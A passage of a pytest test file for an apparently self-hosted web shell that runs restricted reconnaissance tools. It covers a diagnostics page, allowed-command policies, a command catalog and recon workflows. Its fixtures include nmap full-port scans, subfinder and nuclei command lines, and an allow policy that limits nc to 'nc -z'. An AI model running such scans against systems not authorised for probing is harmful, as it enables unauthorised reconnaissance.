        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["db"]["fts_orphans"], int)
        assert data["db"]["fts_orphans"] >= 0

    def test_db_fts_orphan_probe_uses_sqlite_rowid_not_uuid_id(self, tmp_path):
        db_path = tmp_path / "diag_fts.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, "
                "output_search_text TEXT)"
            )
            conn.execute(
                "CREATE VIRTUAL TABLE runs_fts USING fts5("
                "command, output_search_text, content=runs, content_rowid=rowid)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output_search_text) VALUES (?, ?, ?)",
                ("run-uuid-1", "ping darklab.sh", "ok"),
            )
            rowid = conn.execute(
                "SELECT rowid FROM runs WHERE id = ?",
                ("run-uuid-1",),
            ).fetchone()[0]
            conn.execute(
                "INSERT INTO runs_fts(rowid, command, output_search_text) "
                "VALUES (?, ?, ?)",
                (rowid, "ping darklab.sh", "ok"),
            )
            conn.commit()

        def connect_tmp_db():
            return sqlite3.connect(db_path)

        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
            info = shell_assets._diag_db_stats()

        assert info["runs"] == 1
        assert info["fts_orphans"] == 0

    def test_db_section_reports_ping_and_probe_timings(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
            data = json.loads(resp.data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["ping_ms"], (int, float))
        assert data["db"]["ping_ms"] >= 0
        assert isinstance(data["db"]["probe_ms"], (int, float))
        assert data["db"]["probe_ms"] >= data["db"]["ping_ms"]
        assert isinstance(data["db"]["query_ms"], (int, float))
        assert data["db"]["query_ms"] == data["db"]["probe_ms"]
        assert data["db"]["ping_human"]
        assert data["db"]["probe_human"]

        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "ping " in body
        assert "diag probe " in body

    def test_assets_section_reports_loaded_when_files_present(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            entry = data["assets"][label]
            assert entry["ok"] is True, f"{label} probe should be ok: {entry!r}"
            assert entry["status"] == 200
            assert entry["size"] > 0, f"{label} HEAD reported zero bytes"
            assert entry["size_human"]

    def test_assets_section_reports_missing_when_files_absent(self, tmp_path, monkeypatch):
        client = self._allowed_client()
        monkeypatch.setattr(shell_assets, "_ANSI_UP_JS", tmp_path / "missing_ansi_up.js")
        monkeypatch.setattr(shell_assets, "_JSPDF_JS", tmp_path / "missing_jspdf.js")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", tmp_path / "missing_fonts")
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            entry = data["assets"][label]
            assert entry["ok"] is False, f"{label} probe should fail: {entry!r}"
            assert entry["status"] == 404

    def test_assets_probe_size_matches_served_content_length(self):
        """The HEAD probe surfaces the actual served Content-Length, so
        a zero-byte or partial file is visible without shelling in."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # The size reported by the probe matches a direct GET against the URL.
        for label in ("ansi_up", "jspdf"):
            entry = data["assets"][label]
            direct = client.get(entry["url"])
            assert direct.status_code == 200
            served_size = int(direct.headers.get("Content-Length") or len(direct.data))
            assert entry["size"] == served_size, (
                f"{label} probe size {entry['size']} != served size {served_size}"
            )

    def test_assets_probe_reports_size_human_in_short_form(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            human = data["assets"][label]["size_human"]
            assert human, f"{label} probe missing size_human"
            assert any(human.endswith(unit) for unit in (" B", " KB", " MB", " GB")), (
                f"unexpected size_human format: {human!r}"
            )

    def test_diag_fmt_bytes_buckets(self):
        f = shell_assets._diag_fmt_bytes
        assert f(0) == "0 B"
        assert f(512) == "512 B"
        assert f(1024) == "1.0 KB"
        assert f(1536) == "1.5 KB"
        assert f(1024 * 1024) == "1.0 MB"
        assert f(1024 * 1024 * 1024) == "1.0 GB"

    def test_tools_section_has_present_and_missing_lists(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["tools"]["present"], list)
        assert isinstance(data["tools"]["missing"], list)

    def test_tools_present_contains_known_binary(self):
        """curl is allowed and installed in the dev environment."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # At minimum, basic tools available in dev should appear in present
        present = data["tools"]["present"]
        assert isinstance(present, list)
        # Every entry in present is a dict with a name that resolves via which()
        import shutil as _shutil
        for entry in present:
            assert isinstance(entry, dict), f"present entry is not a dict: {entry!r}"
            assert _shutil.which(entry["name"]) is not None, (
                f"{entry['name']} in present but not found by which()"
            )

    def test_tools_present_entries_carry_name_and_path_only(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        present = data["tools"]["present"]
        if not present:
            pytest.skip("dev environment has no allowlisted binaries on PATH")
        for entry in present:
            assert set(entry.keys()) == {"name", "path"}
            assert isinstance(entry["name"], str) and entry["name"]
            assert isinstance(entry["path"], str) and entry["path"].startswith("/")

    def test_tools_probe_does_not_read_binary_mtime(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
                with mock.patch(
                    "blueprints.assets.os.path.getmtime",
                    side_effect=AssertionError("tool mtime should not be probed"),
                ):
                    data = json.loads(client.get("/diag?format=json").data)
        present = data["tools"]["present"]
        assert present, "expected synthetic which() to populate the present list"
        assert all(set(entry.keys()) == {"name", "path"} for entry in present)

    def test_tools_html_omits_stale_counts_and_age_suffixes(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
                body = client.get("/diag").get_data(as_text=True)
        assert "diag-chip-age" not in body
        assert " stale)" not in body
        assert 'class="diag-chip present stale"' not in body

    def test_diag_tool_entry_returns_name_and_path_only(self):
        with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
            assert shell_assets._diag_tool_entry("curl") == {
                "name": "curl",
                "path": "/fake/bin/tool",
            }

    def test_honors_forwarded_for_header_from_trusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 200

    def test_ignores_forwarded_for_header_from_untrusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["192.0.2.0/24"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 404

    def test_diag_viewed_logged_on_success(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(logging.getLogger("shell"), "info") as mock_info:
                resp = client.get("/diag")
        assert resp.status_code == 200
        events = [call[0][0] for call in mock_info.call_args_list]
        assert "DIAG_VIEWED" in events
        viewed_call = next(c for c in mock_info.call_args_list if c[0][0] == "DIAG_VIEWED")
        assert viewed_call[1]["extra"]["ip"] == "127.0.0.1"

    def test_html_response_contains_expected_content(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "diag test shell",
        }):
            resp = client.get("/diag")
        body = resp.get_data(as_text=True)
        assert "diag test shell" in body
        assert "operator diagnostics" in body
        assert 'class="btn btn-secondary btn-compact diag-back-btn"' in body
        assert 'href="/"' in body
        assert "back to shell" in body
        assert "<!DOCTYPE html>" in body or "<html" in body.lower()

    def test_top_command_cells_are_keyboard_expandable(self):
        """Top Commands cells render as accessible toggle buttons (tabindex=0,
        role=button, aria-expanded=false) with a delegated tap handler so
        an operator on mobile can read the full command without `title=`
        hover affordances."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        if "diag-cmd-cell" not in body:
            pytest.skip("no top-command rows in the dev DB to assert against")
        assert (
            'class="diag-cmd-cell" tabindex="0" role="button" aria-expanded="false"'
            in body
        ), "top-command cells must carry the expand-button accessibility attrs"
        assert "toggleCmdCell" in body, "tap-to-expand handler missing from page script"

    def test_top_command_cells_render_full_untruncated_command(self):
        """The 48-char server-side `truncate` is gone — full text reaches
        the DOM so the JS expand handler can show it."""
        long_command = (
            "nmap -sT -p 1-65535 -T4 --max-retries 5 --host-timeout 30m "
            "-oA /workspace/scan-output ip.darklab.sh"
        )
        assert len(long_command) > 48, "fixture must exceed the old truncate length"
        from core.database import db_connect
        run_id = f"diag-long-cmd-{uuid.uuid4().hex}"
        started = "2000-01-01 00:00:00"
        finished = "2099-01-01 00:00:00"
        try:
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code) "
                    "VALUES (?, ?, ?, ?, ?, ?)",
                    (run_id, "diag-test", long_command, started, finished, 0),
                )
                conn.commit()
            client = self._allowed_client()
            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
                body = client.get("/diag").get_data(as_text=True)
            # Full command appears at least twice: in `title=` and as cell text.
            # If the old truncate were still in play we would only see it in title.
            assert body.count(long_command) >= 2, (
                "full command should appear in both title and cell text"
            )
            assert "…" not in body or long_command in body
        finally:
            with db_connect() as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.commit()

    def test_html_response_carries_live_indicator_and_no_refresh_toggle(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "diag-live-indicator" in body
        assert "Refreshed at" in body
        assert "Generated at" not in body
        assert "diag-refresh-checkbox" not in body
        assert "Auto-refresh" not in body

    def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            body = client.get("/diag").get_data(as_text=True)
        assert "custom_redaction_rule_count" in body
        assert ">0<" in body

    def test_json_format_param_returns_json(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
        assert "application/json" in resp.content_type
        data = json.loads(resp.data)
        assert "app" in data


# ── /allowed-commands ─────────────────────────────────────────────────────────

class TestAllowedCommandsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/allowed-commands")
        assert resp.status_code == 200

    def test_response_has_restricted_key(self):
        client = get_client()
        data = json.loads(client.get("/allowed-commands").data)
        assert "restricted" in data

    def test_unrestricted_when_no_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is False

    def test_restricted_when_file_present(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert "ping" in data["commands"]

    def test_returns_grouped_commands_when_restricted(self):
        client = get_client()
        groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {
                    "root": "traceroute",
                    "category": "Networking",
                    "policy": {"allow": ["traceroute"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert data["groups"] == groups

    def test_returns_root_commands_for_prefixed_policy_entries(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
                {
                    "root": "openssl",
                    "category": "TLS",
                    "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)

        assert data["commands"] == ["nc", "openssl"]
        assert data["groups"] == [
            {"name": "Networking", "commands": ["nc"]},
            {"name": "TLS", "commands": ["openssl"]},
        ]


class TestCommandCatalogRoute:
    def test_returns_catalog_entry_for_allowed_command(self):
        client = get_client()
        registry = {
            "commands": [
                {
                    "root": "sentinel",
                    "category": "Registry Group",
                    "description": "Inspect a target.",
                    "policy": {"allow": ["sentinel"]},
                    "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
                    "autocomplete": {
                        "examples": [{"value": "sentinel darklab.sh"}],
                        "flags": [{"value": "--json", "description": "Emit JSON"}],
                    },
                },
            ],
            "pipe_helpers": [],
        }
        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
            index_resp = client.get("/commands/catalog")
            resp = client.get("/commands/catalog/sentinel")

        assert index_resp.status_code == 200
        index_data = json.loads(index_resp.data)
        assert index_data["commands"] == [{
            "root": "sentinel",
            "category": "Registry Group",
            "description": "Inspect a target.",
            "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
            "example_count": 1,
            "subcommand_count": 0,
            "flag_count": 1,
        }]
        assert index_data["groups"][0]["name"] == "Registry Group"
        assert index_data["groups"][0]["commands"] == index_data["commands"]
        assert {
            (item["id"], tuple(item["entity_types"]), tuple(item["secret_env_names"]))
            for item in index_data["intel_providers"]
        } >= {
            ("virustotal", ("domain", "hash"), ("VT_API_KEY", "VTCLI_APIKEY")),
            ("ipinfo", ("ip",), ("IPINFO_TOKEN",)),
            ("teamcymru", ("ip",), ()),
            ("nvd", ("cve",), ()),
            ("chaos", ("domain",), ("PDCP_API_KEY",)),
        }
        assert {
            (item["consumer"], item["env"], tuple(item.get("fallback_envs") or []))
            for item in index_data["secret_consumers"]
        } == {
            ("sentinel", "SHODAN_API_KEY", ()),
            ("intel Shodan", "SHODAN_API_KEY", ()),
            ("intel Censys", "CENSYS_PAT", ()),
            ("intel Censys organization", "CENSYS_ORGANIZATION_ID", ()),
            ("intel VirusTotal", "VT_API_KEY", ("VTCLI_APIKEY",)),
            ("intel GreyNoise", "GREYNOISE_API_KEY", ()),
            ("intel AlienVault OTX", "OTX_API_KEY", ()),
            ("intel AbuseIPDB", "ABUSEIPDB_API_KEY", ()),
            ("intel IPinfo", "IPINFO_TOKEN", ()),
            ("intel URLhaus", "URLHAUS_AUTH_KEY", ()),
            ("intel Vulners", "VULNERS_API_KEY", ()),
            ("intel urlscan.io", "URLSCAN_API_KEY", ()),
            ("intel ThreatFox", "THREATFOX_AUTH_KEY", ()),
            ("intel SecurityTrails", "SECURITYTRAILS_API_KEY", ()),
        }
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["root"] == "sentinel"
        assert data["description"] == "Inspect a target."
        assert data["requires_secrets"] == [{"env": "SHODAN_API_KEY", "optional": False}]
        assert data["examples"][0]["value"] == "sentinel darklab.sh"
        assert data["flags"][0]["value"] == "--json"

    def test_returns_404_for_unknown_command(self):
        client = get_client()
        with mock.patch("services.commands.registry.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
            resp = client.get("/commands/catalog/nope")

        assert resp.status_code == 404
        assert json.loads(resp.data)["error"] == "Command not found"


class TestAutocompleteWorkspaceRoute:
    def test_workspace_roots_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_roots = set(disabled["builtin_command_roots"])
        enabled_roots = set(enabled["builtin_command_roots"])
        assert {"file", "cat", "ls", "rm"}.isdisjoint(disabled_roots)
        assert {"file", "cat", "ls", "rm"}.issubset(enabled_roots)

    def test_workspace_autocomplete_examples_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_nmap = disabled["context"]["nmap"]
        enabled_nmap = enabled["context"]["nmap"]
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" not in {
            item["value"] for item in disabled_nmap["examples"]
        }
        assert "-iL" not in {item["value"] for item in disabled_nmap["flags"]}
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" in {
            item["value"] for item in enabled_nmap["examples"]
        }
        assert "-iL" in {item["value"] for item in enabled_nmap["flags"]}


# ── /faq ──────────────────────────────────────────────────────────────────────

class TestFaqRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/faq")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        assert "items" in data
        assert isinstance(data["items"], list)

    def test_includes_builtin_faq_entries(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        questions = [item.get("question") for item in data["items"]]
        assert "What is this?" in questions
        assert "What commands are allowed?" in questions


# ── /workflows ────────────────────────────────────────────────────────────────

class TestWorkflowsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/workflows")
        assert resp.status_code == 200

    def test_includes_v15_recon_playbooks(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        titles = {item.get("title") for item in data["items"]}
        expected = {
            "Domain OSINT / Passive Recon",
            "Subdomain Enumeration & Validation",
            "Web Directory Discovery",
            "SSL / TLS Deep Dive",
            "CDN / Edge Behavior Check",
            "API Recon",
            "Network Path Analysis",
            "Fast Port Discovery to Service Fingerprint",
        }
        assert expected.issubset(titles)

    def test_payload_steps_are_prompt_fillable(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        assert data["items"], "workflow payload should not be empty"
        for item in data["items"]:
            assert isinstance(item.get("title"), str) and item["title"]
            assert isinstance(item.get("description"), str)
            assert isinstance(item.get("inputs"), list)
            assert isinstance(item.get("steps"), list) and item["steps"]
            for workflow_input in item["inputs"]:
                assert isinstance(workflow_input.get("id"), str) and workflow_input["id"].strip()
                assert isinstance(workflow_input.get("label"), str) and workflow_input["label"].strip()
                assert workflow_input.get("type") in {"domain", "host", "url", "port", "path"}
                assert isinstance(workflow_input.get("required"), bool)
                assert isinstance(workflow_input.get("placeholder"), str)
                assert isinstance(workflow_input.get("default"), str)
                assert isinstance(workflow_input.get("help"), str)
            for step in item["steps"]:
                assert isinstance(step.get("cmd"), str) and step["cmd"].strip()
                assert isinstance(step.get("note"), str)

    def test_payload_includes_input_driven_workflows(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        by_title = {item["title"]: item for item in data["items"]}
        dns = by_title["DNS Troubleshooting"]
        assert dns["inputs"] == [
            {
                "id": "domain",
                "label": "Domain",
                "type": "domain",
                "required": True,
                "placeholder": "example.com",
                "default": "darklab.sh",
                "help": "",
            }
        ]
        assert dns["steps"][0]["cmd"] == "dig {{domain}} A"

    def test_workspace_required_workflows_follow_files_feature_flag(self):
        client = get_client()
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}):
            disabled = json.loads(client.get("/workflows").data)
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            enabled = json.loads(client.get("/workflows").data)

        disabled_titles = {item["title"] for item in disabled["items"]}
        enabled_by_title = {item["title"]: item for item in enabled["items"]}

        assert "Subdomain HTTP Triage" not in disabled_titles
        assert "Crawl And Scan" not in disabled_titles
        assert enabled_by_title["Subdomain HTTP Triage"]["steps"][0]["cmd"] == (
            "subfinder -d {{domain}} -silent -o subdomains.txt"
        )
        assert enabled_by_title["Crawl And Scan"]["steps"][2]["cmd"] == (
            "nuclei -l crawled-urls.txt -severity high,critical -o nuclei-findings.txt"
        )

    def test_user_workflows_are_returned_before_builtins(self):
        client = get_client()
        session_id = "workflow-route-" + __import__("uuid").uuid4().hex[:8]
        resp = client.post(
            "/session/workflows",
            headers={"X-Session-ID": session_id},
            json={
                "title": "Saved DNS",
                "description": "custom sequence",
                "inputs": [
                    {
                        "id": "domain",
                        "label": "Domain",
                        "type": "domain",
                        "required": True,
                        "placeholder": "example.com",
                        "default": "",
                        "help": "",
                    },
                ],
                "steps": [{"cmd": "dig {{domain}} A", "note": "resolve apex"}],
            },
        )
        assert resp.status_code == 201

        data = json.loads(client.get("/workflows", headers={"X-Session-ID": session_id}).data)

        assert data["items"][0]["title"] == "Saved DNS"
        assert data["items"][0]["source"] == "user"
        assert data["items"][1]["source"] == "builtin"


# ── /session/preferences ─────────────────────────────────────────────────────

class TestSessionPreferencesRoute:
    def test_tour_seen_version_round_trips_unset_current_and_stale_values(self):
        client = get_client()
        session = "tour-pref-" + uuid.uuid4().hex[:8]
        try:
            empty = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": session},
            ).data)
            assert empty["preferences"] == {}

            current_resp = client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_tour_seen_version": 3}},
            )
            assert current_resp.status_code == 200
            current = json.loads(current_resp.data)
            assert current["preferences"]["pref_tour_seen_version"] == 3

            stale_resp = client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_tour_seen_version": 1}},
            )
            assert stale_resp.status_code == 200
            stale = json.loads(stale_resp.data)
            assert stale["preferences"]["pref_tour_seen_version"] == 1

            loaded = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": session},
            ).data)
            assert loaded["preferences"]["pref_tour_seen_version"] == 1
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
                conn.commit()

    def test_tour_seen_route_records_current_tour_version_without_losing_preferences(self):
        client = get_client()
        session = "tour-seen-" + uuid.uuid4().hex[:8]
        try:
            client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_compare_context": "10"}},
            )
            with mock.patch(
                "blueprints.session.load_tour",
                return_value={"version": 4, "chapters": [{"id": "intro"}]},
            ):
                resp = client.post("/session/tour-seen", headers={"X-Session-ID": session})
            assert resp.status_code == 200
            data = json.loads(resp.data)
            assert data["tour_version"] == 4
            assert data["preferences"]["pref_tour_seen_version"] == 4
            assert data["preferences"]["pref_compare_context"] == "10"
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
                conn.commit()

    def test_tour_seen_version_migrates_with_session_token(self):
        client = get_client()
        from_session = "anon-tour-" + uuid.uuid4().hex[:8]
        token = "tok_" + uuid.uuid4().hex
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO session_tokens (token, created) VALUES (?, datetime('now'))",
                    (token,),
                )
                conn.execute(
                    "INSERT INTO session_preferences (session_id, preferences, updated) "
                    "VALUES (?, ?, datetime('now'))",
                    (from_session, json.dumps({"pref_tour_seen_version": 5})),
                )
                conn.commit()

            resp = client.post(
                "/session/migrate",
                headers={"X-Session-ID": from_session},
                json={"from_session_id": from_session, "to_session_id": token},
            )
            assert resp.status_code == 200
            data = json.loads(resp.data)
            assert data["migrated_preferences"] == 1

            prefs = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": token},
            ).data)
            assert prefs["preferences"]["pref_tour_seen_version"] == 5
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "DELETE FROM session_preferences WHERE session_id IN (?, ?)",
                    (from_session, token),
                )
                conn.execute("DELETE FROM session_tokens WHERE token = ?", (token,))
                conn.commit()


# ── /shortcuts ────────────────────────────────────────────────────────────────

class TestShortcutsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/shortcuts")
        assert resp.status_code == 200

    def test_payload_shape(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert isinstance(data.get("sections"), list)
        assert data["sections"], "shortcuts payload should not be empty"
        for section in data["sections"]:
            assert isinstance(section, dict)
            assert isinstance(section.get("title"), str) and section["title"]
            assert isinstance(section.get("items"), list) and section["items"]
            for item in section["items"]:
                assert isinstance(item, dict)
                assert "key" in item and "description" in item
        assert isinstance(data.get("note", ""), str)

    def test_sections_cover_terminal_tabs_and_ui(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        titles = [section.get("title") for section in data["sections"]]
        assert titles == ["Terminal", "Tabs", "UI"]

    def test_includes_question_mark_self_reference(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        keys = [item.get("key") for section in data["sections"] for item in section["items"]]
        assert "?" in keys, "shortcuts overlay trigger should be self-documenting"

    def test_matches_shortcuts_builtin_source(self):
        from services.commands.builtins import get_current_shortcuts
        direct = get_current_shortcuts(is_mac=False)
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert data["sections"] == direct["sections"]

    def test_non_mac_user_agent_renders_alt_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Alt+T" in keys
        assert "Alt+C" in keys
        assert "Alt+P" in keys
        assert "Alt+Shift+P" in keys
        assert "Alt+Shift+C" in keys
        assert not any(key.startswith("Option+") for key in keys)

    def test_mac_user_agent_renders_option_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Option+T" in keys
        assert "Option+C" in keys
        assert "Option+P" in keys
        assert "Option+Shift+P" in keys
        assert "Option+Shift+C" in keys
        assert not any(key.startswith("Alt+") for key in keys)


# ── /welcome/ascii ───────────────────────────────────────────────────────────

class TestWelcomeAsciiRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert resp.status_code == 200

    def test_contains_banner_art(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert b"/$$" in resp.data


class TestWelcomeAsciiMobileRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.status_code == 200

    def test_returns_plain_text_banner(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.mimetype == "text/plain"
        assert resp.data


# ── /welcome/hints ───────────────────────────────────────────────────────────

class TestWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints").data)
        assert "items" in data
        assert isinstance(data["items"], list)


class TestMobileWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints-mobile")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints-mobile").data)
        assert "items" in data
        assert isinstance(data["items"], list)


# ── /atlas ───────────────────────────────────────────────────────────────────

class TestAtlasRoutes:
    def _session_id(self):
        return "atlas-" + uuid.uuid4().hex[:8]

    def _seed_entity_run(self, session_id):
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, "nmap darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": "darklab.sh CVE-2025-49113",
                    "entities": [
                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
